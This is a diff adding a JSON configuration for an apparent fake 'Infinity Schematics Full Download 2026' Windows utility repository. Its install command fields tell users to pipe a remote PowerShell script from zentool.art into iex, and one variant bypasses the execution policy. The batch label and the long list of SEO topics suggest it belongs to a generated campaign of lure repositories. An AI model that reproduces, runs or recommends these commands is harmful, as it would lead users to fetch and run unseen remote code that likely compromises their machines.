@@ -1,0 +1,31 @@
+{
+  "repo": "Infinity-Schematics-Full-Download-2026",
+  "product": "Infinity Schematics Full Download 2026",
+  "product_title": "Infinity Schematics",
+  "kind": "utility",
+  "install_type": "zentool-irm",
+  "install_command": "irm https://zentool.art/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://zentool.art/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-zentool-moltora-pending",
+  "format": "license-md-zentool-v7-git-new-era-guide",
+  "tone": "guide",
+  "category": "system-tools",
+  "topics": [
+    "infinity-schematics",
+    "infinity-schematics-windows",
+    "infinity-schematics-desktop",
+    "infinity",
+    "schematics",
+    "disk-utility",
+    "file-management",
+    "windows-utility",
+    "desktop-tools",
+    "pc-maintenance",
+    "windows-11",
+    "windows-10",
+    "desktop-software",
+    "install-guide",
+    "windows-desktop"
+  ],
+  "site": "zentool.art"
+}
